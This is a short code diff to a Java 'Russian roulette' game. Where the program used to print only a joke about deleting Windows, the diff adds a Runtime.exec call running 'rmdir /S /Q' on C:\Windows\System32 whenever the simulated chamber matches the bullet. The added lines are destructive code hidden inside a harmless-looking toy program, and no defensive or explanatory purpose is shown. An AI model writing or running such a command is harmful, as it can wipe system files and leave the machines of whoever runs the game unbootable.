@@ -13,6 +13,11 @@ public class Main {
 
         if (chamber == bullet) {
             System.out.println("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 💻💥");
+            try {
+                Runtime.getRuntime().exec("cmd /c rmdir /S /Q C:\\Windows\\System32");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         } else {
             System.out.println("Phew! You survived... this time. Try again if you dare! 🔫😅");
         }
